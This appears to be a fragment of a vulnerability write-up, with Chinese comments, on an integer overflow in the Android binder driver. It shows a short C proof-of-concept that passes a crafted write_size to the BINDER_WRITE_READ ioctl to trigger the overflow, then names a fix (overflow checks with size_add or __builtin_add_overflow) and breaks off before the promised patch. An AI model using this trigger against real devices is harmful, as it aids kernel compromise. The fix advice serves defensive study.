#include <sys/ioctl.h>
#include <linux/binder.h>

int fd = open("/dev/binder", O_RDONLY);
struct binder_write_read bwr;
bwr.write_size = 0xFFFFFFFF - sizeof(struct binder_thread) + 1;  // 触发溢出
bwr.write_buffer = (unsigned long)malloc(0x1000);
// 填充write_buffer内容
ioctl(fd, BINDER_WRITE_READ, &bwr);


**修复方法：** 在分配前检查加法是否溢出，使用`size_add`或`__builtin_add_overflow`。补丁如下：
